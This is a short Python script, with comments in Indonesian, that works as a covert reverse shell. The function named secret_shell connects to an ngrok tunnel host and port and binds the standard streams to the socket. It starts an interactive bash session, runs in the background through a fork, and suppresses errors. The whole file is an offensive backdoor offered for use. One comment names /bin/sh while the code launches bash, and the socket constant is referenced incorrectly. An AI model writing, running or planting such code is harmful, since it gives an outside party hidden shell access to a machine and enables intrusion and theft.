import socket
import subprocess
import os

# Gunakan port yang berbeda dari 2222 atau port web
def secret_shell():
    RHOST = "0.tcp.ap.ngrok.io" 
    RPORT = 18230 # Pilih port yang belum dipakai
    
    s = socket.socket(socket.socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((RHOST, RPORT))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        
        # Menggunakan /bin/sh agar lebih ringan dan tidak interferensi dengan shell utama
        p = subprocess.call(["/bin/bash", "-i"])
    except Exception:
        pass
    finally:
        s.close()

if __name__ == "__main__":
    # Menjalankan di background (daemonize)
    if os.fork() <= 0:
        secret_shell()
